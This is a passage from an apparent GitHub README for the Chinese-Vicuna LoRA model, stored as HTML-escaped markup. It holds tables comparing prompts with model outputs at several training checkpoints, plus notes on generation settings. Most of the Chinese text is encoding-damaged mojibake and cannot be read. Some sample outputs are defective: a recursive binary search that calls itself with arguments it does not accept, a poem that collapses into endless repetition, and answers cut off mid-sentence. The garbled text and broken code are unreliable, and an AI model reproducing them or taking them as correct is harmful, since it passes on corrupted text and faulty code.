webui&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://colab.research.google.com/drive/1SOOJjxp02uuUFDNgm4jkvaA_IdNnnvdk?usp=sharing&#34;&gt;&lt;img src=&#34;https://camo.githubusercontent.com/84f0493939e0c4de4e6dbe113251b4bfb5353e57134ffd9fcab6b8714514d4d1/68747470733a2f2f636f6c61622e72657365617263682e676f6f676c652e636f6d2f6173736574732f636f6c61622d62616467652e737667&#34; alt=&#34;Open In Colab&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Finetune with the data we collected&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Performance&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Checkpoint-4000&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Human&lt;/th&gt; &#xA;   &lt;th&gt;Chinese-Vicuna&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ÁîüÊàê‰∏Ä‰ªΩpythonÁöÑÊéíÂ∫è‰ª£Á†Å&lt;/td&gt; &#xA;   &lt;td&gt;AÔºödef sort_list(lst):&lt;br&gt; lst.sort()&lt;br&gt; return lst&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÊòØ‰ªÄ‰πà&lt;/td&gt; &#xA;   &lt;td&gt;Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÊòØ‰∏ÄÁßçËÆ°ÁÆóÊú∫ÁßëÂ≠¶È¢ÜÂüüÔºåÊó®Âú®‰ΩøËÆ°ÁÆóÊú∫ËÉΩÂ§üÁêÜËß£ÂíåÂ§ÑÁêÜËá™ÁÑ∂ËØ≠Ë®Ä„ÄÇ&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ËÉΩÁªôÊàëËÆ≤‰∏ÄÊÆµÁ¨ëËØùÂêó&lt;/td&gt; &#xA;   &lt;td&gt;‰∏∫‰ªÄ‰πàÁå´ÂêÉÈ±ºÔºüÂõ†‰∏∫ÂÆÉ‰ª¨ÂñúÊ¨¢Ê∏∏Ê≥≥„ÄÇ&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Â∞Ü‰∏ãÈù¢ÊñáÂ≠óÁøªËØëÊàêËã±Êñá„ÄÇÁå´ÂñúÊ¨¢ÂêÉÈ±ºÔºåÊâÄ‰ª•ÂÆÉ‰ª¨‰ºöÊ∏∏Ê≥≥&lt;/td&gt; &#xA;   &lt;td&gt;Cats like to eat fish, so they will swim.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;233Âíå122ÁöÑÂíåÁ≠â‰∫éÂ§öÂ∞ë&lt;/td&gt; &#xA;   &lt;td&gt;233Âíå122ÁöÑÂíåÁ≠â‰∫é355„ÄÇ&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Âçé‰∏∫ÊòØ‰∏ÄÂÆ∂ÊÄéÊ†∑ÁöÑÂÖ¨Âè∏&lt;/td&gt; &#xA;   &lt;td&gt;Âçé‰∏∫ÊòØ‰∏ÄÂÆ∂ÂÖ®ÁêÉËåÉÂõ¥ÂÜÖÊúÄÂ§ßÁöÑÁßªÂä®ÈÄö‰ø°ËÆæÂ§áÂà∂ÈÄ†ÂïÜ‰πã‰∏ÄÔºå‰ª•Âèä‰∏ÄÂÆ∂ÂÖ®ÁêÉËåÉÂõ¥ÂÜÖÊúÄÂ§ßÁöÑÁßªÂä®ÈÄö‰ø°ËÆæÂ§áÂà∂ÈÄ†ÂïÜ‰πã‰∏Ä„ÄÇÂçé‰∏∫ÂÖ¨Âè∏ÁöÑ‰∏öÂä°Ê∂µÁõñÂåÖÊã¨ÁßªÂä®ÈÄö‰ø°ËÆæÂ§á„ÄÅ‰∫íËÅîÁΩëËÆæÂ§á„ÄÅÊô∫ËÉΩÂÆ∂Â±ÖËÆæÂ§áÁ≠â„ÄÇ&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ÊàëÊÉ≥ÂíåÂ•≥ÊúãÂèãÂú®Âåó‰∫¨Á∫¶‰ºöÔºåËÉΩÊé®ËçêÂá†‰∏™Á∫¶‰ºöÁöÑÂú∞ÊñπÂêó&lt;/td&gt; &#xA;   &lt;td&gt;Âåó‰∫¨ÊúâÂæàÂ§öÁ∫¶‰ºöÁöÑÂú∞ÊñπÔºåÂèØ‰ª•Êé®Ëçê‰ª•‰∏ãÂá†‰∏™Á∫¶‰ºöÁöÑÂú∞ÊñπÔºö&lt;br&gt;&lt;br&gt;1. Âåó‰∫¨Ëâ∫ÊúØÂçöÁâ©È¶Ü&lt;br&gt;2. È¢êÂíåÂõ≠&lt;br&gt;3. Âåó‰∫¨ÊïÖÂÆ´ÂçöÁâ©È¶Ü&lt;br&gt;4. Âåó‰∫¨Â§©ÂÆâÈó®ÂπøÂú∫&lt;br&gt;5. È¢êÂíåÂõ≠È£éÊôØÂå∫&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Áî®pythonÂÜô‰∏Ä‰∏™‰∫åÂàÜÊü•ÊâæÁöÑ‰ª£Á†Å&lt;/td&gt; &#xA;   &lt;td&gt;```python&lt;br&gt;def binary_search(arr, target):&lt;br&gt; low = 0&lt;br&gt; high = len(arr) - 1&lt;br&gt; while low &amp;lt;= high:&lt;br&gt; mid = (low + high) // 2&lt;br&gt; if arr[mid] == target:&lt;br&gt; return mid&lt;br&gt; elif arr[mid] &amp;lt; target:&lt;br&gt; low = mid + 1&lt;br&gt; else:&lt;br&gt; high = mid - 1&lt;br&gt; return -1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ÊÄé‰πàËÆ©Ëá™Â∑±Á≤æÂäõÂÖÖÊ≤õÔºåÂàó5ÁÇπÂª∫ËÆÆ&lt;/td&gt; &#xA;   &lt;td&gt;1. ‰øùÊåÅËâØÂ•ΩÁöÑÁù°Áú†‰π†ÊÉØÔºõ2. ÂÆöÊúüÈîªÁÇºË∫´‰ΩìÔºõ3. Â≠¶‰π†Êñ∞ÊäÄËÉΩÊàñÁü•ËØÜÔºõ4. ‰∏éÂÆ∂‰∫∫ÂíåÊúãÂèã‰∫§ÊµÅÔºõ5. Â§öÂê¨ÊîæÊùæÈü≥‰πê„ÄÇ&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Áà∂ÊØçÈÉΩÂßìÂê¥ÔºåÂèñ‰∏Ä‰∫õÁî∑ÂÆùÂÆùÂíåÂ•≥ÂÆùÂÆùÁöÑÂêçÂ≠ó&lt;/td&gt; &#xA;   &lt;td&gt;Áî∑ÂÆùÂÆùÂèØ‰ª•ÊòØÂê¥Êù∞„ÄÅÂê¥‰ºü„ÄÅÂê¥È£û„ÄÅÂê¥Ëç£Á≠â„ÄÇÂ•≥ÂÆùÂÆùÂèØ‰ª•ÊòØÂê¥Âçé„ÄÅÂê¥ÁßÄ„ÄÅÂê¥Áæé„ÄÅÂê¥Â©∑Á≠â„ÄÇ&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;This LORA model is the result of 30 hours of training with a 2080Ti (checkpoint-4000), about 50w data&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Checkpoint-8000&lt;/strong&gt;(about 1.5 epoch on belle+guanaco)&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Human&lt;/th&gt; &#xA;   &lt;th&gt;Chinese-Vicuna&lt;/th&gt; &#xA;   &lt;th&gt;Note&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ÂÜô‰∏ÄÁØáËã±ÊñáÊï£ÊñáËØóÔºå‰∏ªÈ¢òÊòØÊò•Èõ®ÔºåÊÉ≥Ë±°Ëá™Â∑±ÊòØÊò•Èõ®ÔºåÂíåËã±ÂõΩÂè§‰ª£ËØó‰∫∫ËééÂ£´ÊØî‰∫ö‰∫§ÊµÅ&lt;/td&gt; &#xA;   &lt;td&gt;A: Spring rain falls softly on my face,&lt;br&gt;A cool breeze blows through my hair,&lt;br&gt;The sun shines brightly in the sky,&lt;br&gt;And I feel as if I am flying high.&lt;br&gt;&lt;br&gt;The birds chirp happily in the trees,&lt;br&gt;The flowers bloom and their scent fills the air,&lt;br&gt;The bees buzz gently from flower to flower,&lt;br&gt;And the world seems to come alive once more.&lt;br&gt;&lt;br&gt;I can hear the rush of the river,&lt;br&gt;The sound of the waterfalls,&lt;br&gt;The splash of the raindrops on the rocks,&lt;br&gt;And the gentle murmur of the stream.&lt;br&gt;&lt;br&gt;My heart is filled with joy and peace,&lt;br&gt;As I take in the beauty around me,&lt;br&gt;The warmth of the sun on my skin,&lt;br&gt;And the freshness of the spring air.&lt;/td&gt; &#xA;   &lt;td&gt;Repetition Penalty=2.2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ÂÜô‰∏ÄÁØáËã±ÊñáÊï£ÊñáËØóÔºå‰∏ªÈ¢òÊòØÊò•Èõ®ÔºåÊÉ≥Ë±°Ëá™Â∑±ÊòØÊò•Èõ®ÔºåÂíåËã±ÂõΩÂè§‰ª£ËØó‰∫∫ËééÂ£´ÊØî‰∫ö‰∫§ÊµÅ&lt;/td&gt; &#xA;   &lt;td&gt;Êò•Èõ®Êª¥Êª¥ÊªöÊªöÔºå&lt;br&gt;ÊªöÊªöÊªöÊªöÊªöÊªö„ÄÇ&lt;br&gt;ÊªöÊªöÊªöÊªöÊªöÊªöÔºå&lt;br&gt;ÊªöÊªöÊªöÊªöÊªöÊªö„ÄÇ&lt;br&gt;&lt;br&gt;Êò•Èõ®ÊªöÊªöÊªöÔºå&lt;br&gt;ÊªöÊªöÊªöÊªöÊªöÊªö„ÄÇ&lt;br&gt;ÊªöÊªöÊªöÊªöÊªöÊªöÔºå&lt;br&gt;ÊªöÊªöÊªöÊªöÊªöÊªö„ÄÇ&lt;br&gt;&lt;br&gt;Êò•Èõ®ÊªöÊªöÊªöÔºå&lt;br&gt;ÊªöÊªöÊªöÊªöÊªöÊªö„ÄÇ&lt;br&gt;ÊªöÊªöÊªöÊªöÊªöÊªöÔºå&lt;br&gt;ÊªöÊªöÊªöÊªöÊªöÊªö„ÄÇ&lt;br&gt;&lt;br&gt;Êò•Èõ®ÊªöÊªöÊªöÔºå&lt;br&gt;ÊªöÊªöÊªö&lt;/td&gt; &#xA;   &lt;td&gt;Repetition Penalty=1.0&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Spring rain falls softly on my face,&lt;br&gt;A cool breeze blows through my hair,&lt;br&gt;The sun shines brightly in the sky,&lt;br&gt;And I feel as if I am flying high.&lt;br&gt;&lt;br&gt;The birds chirp happily in the trees,&lt;br&gt;The flowers bloom and their scent fills the air,&lt;br&gt;The bees buzz gently from flower to flower,&lt;br&gt;And the world seems to come alive once more.&lt;br&gt;&lt;br&gt;I can hear the rush of the river,&lt;br&gt;The sound of the waterfalls,&lt;br&gt;The splash of the raindrops on the rocks,&lt;br&gt;And the gentle murmur of the stream.&lt;br&gt;&lt;br&gt;My heart is filled with joy and peace,&lt;br&gt;As I take in the beauty around me,&lt;br&gt;The warmth of the sun on my skin,&lt;br&gt;And the freshness of the spring air.&lt;br&gt;Êää‰∏äÈù¢ÁöÑÊï£ÊñáËØóÁøªËØëÊàê‰∏≠Êñá&lt;/td&gt; &#xA;   &lt;td&gt;Êò•Èõ®ËΩªËΩªÊ¥íËêΩÂú®ÊàëÁöÑËÑ∏‰∏äÔºå&lt;br&gt;ËΩªËΩªÁöÑÈ£éËΩªËΩªÂêπËøáÊàëÁöÑÂ§¥ÂèëÔºå&lt;br&gt;Èò≥ÂÖâÊòéÂ™öÂú∞ÁÖßËÄÄÂú®Â§©Á©∫Ôºå&lt;br&gt;ÊàëÊÑüËßâËá™Â∑±Âú®È£ûÈ´ò„ÄÇ&lt;br&gt;&lt;br&gt;È∏üÂÑøÂú®Ê†ëÊûù‰∏äÂî±Ê≠åÔºå&lt;br&gt;Ëä±ÊúµÂºÄÊîæÔºåÂÆÉ‰ª¨ÁöÑÈ¶ôÊ∞îÂÖÖÊª°‰∫ÜÁ©∫Ê∞îÔºå&lt;br&gt;ËúúËúÇÂú®Ëä±ÊúµÈó¥È£ûËàûÔºå&lt;br&gt;ÂÆÉ‰ª¨ÁöÑÈ∏£Â£∞ÂÖÖÊª°‰∫ÜÊ∏©Êöñ„ÄÇ&lt;br&gt;&lt;br&gt;ÊàëÂê¨Âà∞Ê≤≥ÊµÅÁöÑÂ£∞Èü≥Ôºå&lt;br&gt;Ê∞¥ÁÄëÂú®Â≤©Áü≥‰∏äËΩªËΩªÊª¥Êª¥Ôºå&lt;br&gt;Èõ®Ê∞¥Âú®Áü≥Â§¥‰∏äËΩªËΩªÊª¥Êª¥Ôºå&lt;br&gt;ÂÆÉ‰ª¨ÁöÑÂ£∞Èü≥ÂÖÖÊª°‰∫ÜÂÆÅÈùô„ÄÇ&lt;br&gt;&lt;br&gt;ÊàëÁöÑÂøÉÂÖÖÊª°‰∫ÜÂñúÊÇ¶ÂíåÂπ≥Ôºå&lt;br&gt;ÊàëÊÑüÂèóÂà∞ÁÉ≠Êµ™ÁöÑÈò≥ÂÖâÔºå&lt;br&gt;Ê∏©ÊöñÁöÑÁ©∫Ê∞îÊ¥íÂú®ÊàëÁöÑËÑ∏‰∏äÔºå&lt;br&gt;ÊàëÊÑüÂèóÂà∞Êò•Â≠£ÁöÑÁæé&lt;/td&gt; &#xA;   &lt;td&gt;beams=2Ôºåmax tokens=350&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Classify the sentiment of the following sentence into Positive, Neutral, or Negative:&lt;br&gt;Super excited about teaching Stanford‚Äôs first course on Large Language Models! Check the syllabus out here&lt;/td&gt; &#xA;   &lt;td&gt;Positive&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;‰ªäÂ§©Â§©Ê∞îÊÄé‰πàÊ†∑ÔºåÊääËøôÂè•ËØùÁøªËØëÊàêËã±ËØ≠&lt;/td&gt; &#xA;   &lt;td&gt;What&#39;s the weather like today?&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;‰ªäÂ§©Â§©Ê∞îÊÄé‰πàÊ†∑ÔºåÊääËøôÂè•ËØùÁøªËØëÊàêÊó•ËØ≠&lt;/td&gt; &#xA;   &lt;td&gt;‰ªäÂ§©„ÅÆÂ§©Ê∞ó„ÅØ‰Ωï„Åß„Åô„ÅãÔºü&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ÊòéÂ§©Â∞±ÂÅáÊúüÁªìÊùü‰∫ÜÔºåÊúâÁÇπÊäóÊãí‰∏äÁè≠ÔºåÂ∫îËØ•‰ªÄ‰πàÂäûÔºü&lt;/td&gt; &#xA;   &lt;td&gt;ÊòéÂ§©Â∞±ÂÅáÊúüÁªìÊùü‰∫ÜÔºåÊúâÁÇπÊäóÊãí‰∏äÁè≠ÔºåÂ∫îËØ•‰ªÄ‰πàÂäûÔºüÂèØ‰ª•ËÄÉËôë‰∏Ä‰∫õÊúâË∂£ÁöÑÊ¥ªÂä®ÔºåÊØîÂ¶ÇÂéªÁúãÁîµÂΩ±„ÄÅÈòÖËØª‰π¶Á±ç„ÄÅÂê¨Èü≥‰πê„ÄÅÂéªÊ∏∏Ê≥≥Ê±†ÊàñËÄÖÂèÇÂä†Êà∑Â§ñÊ¥ªÂä®Á≠â„ÄÇÊ≠§Â§ñÔºå‰πüÂèØ‰ª•ËÄÉËôë‰∏Ä‰∫õÂÆ∂Â∫≠Ê¥ªÂä®ÔºåÊØîÂ¶ÇÂÅöÁÉπÈ•™„ÄÅÂÅöÁé©ÂÖ∑„ÄÅÂÅöÊâãÂ∑•Ëâ∫ÂìÅÁ≠â„ÄÇ&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Tell me five words that rhyme with &#39;shock&#39;.&lt;/td&gt; &#xA;   &lt;td&gt;Five words that rhyme with&#39;shock&#39; are: &lt;br&gt;1. Rock &lt;br&gt;2. Lock &lt;br&gt;3. Cock &lt;br&gt;4. Hock &lt;br&gt;5. Stock&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;We can find that you do not punish him a little, he will mess up, if the generation effect is not good, you can increase the Repetition Penalty, beams, topk.&lt;/li&gt; &#xA; &lt;li&gt;If your input is long, we suggest you can turn down the beams&lt;/li&gt; &#xA; &lt;li&gt;The checkpoint-8000 has some Japanese language skills, but not strong&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Checkpoint-final&lt;/strong&gt; (3 epoch on belle+guanaco)&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Human&lt;/th&gt; &#xA;   &lt;th&gt;Chinese-Vicuna&lt;/th&gt; &#xA;   &lt;th&gt;Note&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ÁîüÊàê‰∏Ä‰ªΩpythonÁöÑÊéíÂ∫è‰ª£Á†Å&lt;/td&gt; &#xA;   &lt;td&gt;def bubble_sort(arr):&lt;br&gt; for i in range(len(arr)):&lt;br&gt; for j in range(len(arr)-i-1):&lt;br&gt; if arr[j] &amp;gt; arr[j+1]:&lt;br&gt; arr[j], arr[j+1] = arr[j+1], arr[j]&lt;br&gt; return arr&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ÁîüÊàê‰∏Ä‰ªΩÁÆÄÂçïÁöÑpythonÁöÑÊéíÂ∫è‰ª£Á†Å&lt;/td&gt; &#xA;   &lt;td&gt;def sort_list(lst):&lt;br&gt; return sorted(lst)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Áî®pythonÂÜô‰∏Ä‰∏™‰∫åÂàÜÊü•ÊâæÁöÑ‰ª£Á†Å&lt;/td&gt; &#xA;   &lt;td&gt;def binary_search(arr, target):&lt;br&gt; low = 0&lt;br&gt; high = len(arr) - 1&lt;br&gt; while low &amp;lt;= high:&lt;br&gt; mid = (low + high) // 2&lt;br&gt; if arr[mid] == target:&lt;br&gt; return mid&lt;br&gt; elif arr[mid] &amp;lt; target:&lt;br&gt; low = mid + 1&lt;br&gt; else:&lt;br&gt; high = mid - 1&lt;br&gt; return -1&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Áî®pythonÂÜô‰∏Ä‰∏™ÈÄíÂΩíÁöÑ‰∫åÂàÜÊü•ÊâæÁöÑ‰ª£Á†Å&lt;/td&gt; &#xA;   &lt;td&gt;def binary_search(arr, target):&lt;br&gt; if len(arr) == 0:&lt;br&gt; return -1&lt;br&gt; mid = len(arr) // 2&lt;br&gt; if arr[mid] == target:&lt;br&gt; return mid&lt;br&gt; if arr[mid] &amp;lt; target:&lt;br&gt; return binary_search(arr, target, 0, mid-1)&lt;br&gt; else:&lt;br&gt; return binary_search(arr, target, mid+1, len(arr)-1)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÊòØ‰ªÄ‰πà&lt;/td&gt; &#xA;   &lt;td&gt;Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÔºàNatural Language ProcessingÔºåNLPÔºâÊòØ‰∏ÄÁßçËÆ°ÁÆóÊú∫ÁßëÂ≠¶È¢ÜÂüüÔºåÊó®Âú®‰ΩøËÆ°ÁÆóÊú∫ËÉΩÂ§üÁêÜËß£„ÄÅÂ§ÑÁêÜÂíåÁîüÊàêËá™ÁÑ∂ËØ≠Ë®Ä„ÄÇÂÆÉÂåÖÊã¨Êú∫Âô®ÁøªËØë„ÄÅËØ≠Èü≥ËØÜÂà´„ÄÅÊñáÊú¨ÂàÜÁ±ª„ÄÅÊÉÖÊÑüÂàÜÊûêÁ≠âÊäÄÊúØ„ÄÇ&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ËÉΩÁªôÊàëËÆ≤‰∏ÄÊÆµÁ¨ëËØùÂêó&lt;/td&gt; &#xA;   &lt;td&gt;‰∏∫‰ªÄ‰πàÈ∏üÂÑøÂñúÊ¨¢Âî±Ê≠åÔºüÂõ†‰∏∫ÂÆÉ‰ª¨Áü•ÈÅìÔºåÂ¶ÇÊûú‰∏çÂî±Ê≠åÔºå‰ªñ‰ª¨Â∞±‰ºöË¢´È∏üÂ∑¢Êäì‰ΩèÔºÅ&lt;/td&gt; &#xA;   &lt;td&gt;Repetition Penalty=2.0&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ËÉΩÁªôÊàëËÆ≤‰∏ÄÊÆµÂÖ≥‰∫éÁãóÁ¨ëËØùÂêó&lt;/td&gt; &#xA;   &lt;td&gt;‰∏∫‰ªÄ‰πàÁãó‰∏çÂñúÊ¨¢È™ëËá™Ë°åËΩ¶ÔºüÂõ†‰∏∫ÂÆÉ‰ª¨ÊÄªÊòØÊÉ≥Ë¶Å‰∏ãËΩ¶ÔºÅ&lt;/td&gt; &#xA;   &lt;td&gt;Repetition Penalty=2.0&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Â∞Ü‰∏ãÈù¢ÊñáÂ≠óÁøªËØëÊàêËã±Êñá„ÄÇÁå´ÂñúÊ¨¢ÂêÉÈ±ºÔºåÊâÄ‰ª•ÂÆÉ‰ª¨‰ºöÊ∏∏Ê≥≥&lt;/td&gt; &#xA;   &lt;td&gt;Cats like to eat fish, so they will swim.&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ÊàëÊÉ≥ÂíåÂ•≥ÊúãÂèãÂú®Âåó‰∫¨Á∫¶‰ºöÔºåËÉΩÊé®ËçêÂá†‰∏™Á∫¶‰ºöÁöÑÂú∞ÊñπÂêó&lt;/td&gt; &#xA;   &lt;td&gt;Âåó‰∫¨ÊúâÂæàÂ§öÂæàÂ•ΩÁöÑÁ∫¶‰ºöÂú∞ÊñπÔºåÊØîÂ¶ÇÈ¢êÂíåÂõ≠„ÄÅÊïÖÂÆ´„ÄÅÂ§©ÂÆâÈó®ÂπøÂú∫Á≠â„ÄÇ&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ÊàëÊÉ≥ÂíåÂ•≥ÊúãÂèãÂú®Âåó‰∫¨Á∫¶‰ºöÔºåËÉΩÊé®ËçêÂá†‰∏™Á∫¶‰ºöÁöÑÂú∞ÊñπÂπ∂ÁªôÂá∫ÊîªÁï•Âêó&lt;/td&gt; &#xA;   &lt;td&gt;Âåó‰∫¨ÊúâÂæàÂ§öÂèóÊ¨¢ËøéÁöÑÁ∫¶‰ºöÂú∞ÊñπÔºå‰ª•‰∏ãÊòØÂá†‰∏™Êé®ËçêÔºö&lt;br&gt;&lt;br&gt;1. È¢êÂíåÂõ≠ÔºöÈ¢êÂíåÂõ≠ÊòØÂåó‰∫¨ÊúÄËëóÂêçÁöÑÂÖ¨Âõ≠‰πã‰∏ÄÔºåÊã•Êúâ‰∏∞ÂØåÁöÑÊñáÂåñÈÅó‰∫ßÂíåÁæé‰∏ΩÁöÑÊôØËßÇ„ÄÇ&lt;br&gt;&lt;br&gt;2. Â§©ÂÆâÈó®ÂπøÂú∫ÔºöÂ§©ÂÆâÈó®ÂπøÂú∫ÊòØÂåó‰∫¨ÊúÄÂèóÊ¨¢ËøéÁöÑÊóÖÊ∏∏ÊôØÁÇπ‰πã‰∏ÄÔºåÊã•Êúâ‰∏∞ÂØåÁöÑÊñáÂåñÈÅó‰∫ßÂíåÁæé‰∏ΩÁöÑÊôØËßÇ„ÄÇ&lt;br&gt;&lt;br&gt;3. ÊïÖÂÆ´ÂçöÁâ©Èô¢ÔºöÊïÖÂÆ´ÂçöÁâ©Èô¢ÊòØ‰∏≠ÂõΩÊúÄÂèóÊ¨¢ËøéÁöÑÊóÖÊ∏∏ÊôØÁÇπ‰πã‰∏ÄÔºåÊã•Êúâ‰∏∞ÂØåÁöÑÊñáÂåñÈÅó‰∫ßÂíåÁæé‰∏ΩÁöÑÊôØËßÇ„ÄÇ&lt;br&gt;&lt;br&gt;4. ÈïøÂüéÔºöÈïøÂüéÊòØ‰∏≠ÂõΩÊúÄÂèóÊ¨¢ËøéÁöÑÊóÖÊ∏∏ÊôØÁÇπ‰πã‰∏ÄÔºåÊã•Êúâ‰∏∞ÂØåÁöÑÊñáÂåñÈÅó‰∫ßÂíåÁæé&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;233Âíå122ÁöÑÂíåÁ≠â‰∫éÂ§öÂ∞ë&lt;/td&gt; &#xA;   &lt;td&gt;233Âíå122ÁöÑÂíåÁ≠â‰∫é355„ÄÇ&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Âçé‰∏∫ÊòØ‰∏ÄÂÆ∂ÊÄéÊ†∑ÁöÑÂÖ¨Âè∏&lt;/td&gt; &#xA;   &lt;td&gt;Âçé‰∏∫ÊòØ‰∏ÄÂÆ∂ÂÖ®ÁêÉÈ¢ÜÂÖàÁöÑÊäÄÊúØÂÖ¨Âè∏ÔºåÊã•Êúâ‰∏∞ÂØåÁöÑÊäÄÊúØÁ†îÂèëËÉΩÂäõÂíå‰ºòË¥®ÁöÑ‰∫ßÂìÅÁ∫ø„ÄÇÂÆÉÁöÑ‰∫ßÂìÅÊ∂µÁõñ‰∫ÜÂêÑÁßçÈ¢ÜÂüüÔºåÂåÖÊã¨ÁßªÂä®ÈÄö‰ø°„ÄÅËÆ°ÁÆóÊú∫„ÄÅ‰∫íËÅîÁΩë„ÄÅÊô∫ËÉΩÂÆ∂Â±ÖÁ≠â„ÄÇÂçé‰∏∫Êã•Êúâ‰∏∞ÂØåÁöÑÁ†îÂèë‰∫∫ÂëòÂíåÊäÄÊúØÂõ¢ÈòüÔºå‰ª•Âèä‰ºòË¥®ÁöÑ‰∫ßÂìÅË¥®Èáè„ÄÇ&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Ë•øÁìúÊòØ‰ªÄ‰πàÔºåËØ∑Áî®ËØ¶ÁªÜÁöÑËØ≠Ë®ÄÂõûÁ≠îÊàë&lt;/td&gt; &#xA;   